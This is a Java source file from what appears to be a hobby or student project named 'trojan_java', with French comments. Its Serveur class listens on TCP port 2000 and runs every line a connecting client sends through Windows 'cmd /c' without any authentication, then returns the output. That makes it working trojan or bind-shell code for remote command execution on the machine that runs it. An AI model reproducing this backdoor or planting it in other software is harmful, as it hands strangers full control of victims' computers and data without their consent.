/*
 * To change this template, choose Tools | Templates
 * and open the template in the editor.
 */
package trojan_java.Modele;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.net.ServerSocket;
import java.net.Socket;
import java.nio.charset.Charset;

/**
 *
 * @author rayanox
 */
public class Serveur{
    
    
    public Serveur() {
    }
    
    public void run() {
        String messageRecu;
        
        try {
            ServerSocket socket = new ServerSocket(2000);
            
            //Ecoute de connexion infinie
            while(true) {
            
                try {
                
                
                System.out.println("(serveur) : Mise en écoute de connexion...");
                Socket socketClientServeur = socket.accept();
                System.out.println("(serveur) : Connexion réussie !");
                
                BufferedReader bufferReception = new BufferedReader(new InputStreamReader(socketClientServeur.getInputStream()));
                PrintWriter bufferEnvoie = new PrintWriter(new BufferedWriter(new OutputStreamWriter(socketClientServeur.getOutputStream())));
                
                //Echanges
                do {

                    System.out.println("(Serveur) : Ecoute de messages...");
                    messageRecu = bufferReception.readLine();
                    
                    System.out.println("(Serveur) : Message = "+messageRecu);
                    
                    String responseCommand = executeCommand(messageRecu);
                    
                    bufferEnvoie.println(responseCommand); // accusé de réception
                    bufferEnvoie.flush();
                }while(!messageRecu.equals("fin"));
                
                
                
                
                } catch (IOException ex) {
                    System.out.println("(Serveur) : Connection avec socket client = PROBLEME\r\n" + ex.getMessage());
                } catch (Exception e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
            
            }
            
            
        } catch (IOException ex) {
            System.out.println("(Serveur) : Création de la socket = PROBLEME\r\n" + ex.getMessage());
            ex.printStackTrace();
        }
        
        
        System.out.println("(Serveur) : Fin d'execution");
        
    }
    
    private static String executeCommand(String cmd) throws Exception {
    	if(isWindowsEnv()) {
    		String [] cmdarray = new String [] {"cmd", "/c", cmd };
//			Process p = Runtime.getRuntime().exec(cmdarray );
			ProcessBuilder procBuilder = new ProcessBuilder(cmdarray);
			procBuilder.redirectErrorStream(true);
			Process p = procBuilder.start();
			return readInputStream(p.getInputStream());
    	}else {
    		throw new Exception("The command for the Linux env. has not been implemented");
    	}
    }
    
    private static String readInputStream(InputStream inputStream) throws IOException {
		BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream, "CP437"));
		String line, result = "";
		while((line = reader.readLine()) != null) {
			result += line + "\r\n";
		}
		return result;
	}

	private static boolean isWindowsEnv() {
    	return System.getProperty("os.name").toLowerCase().contains("win");
    }
}
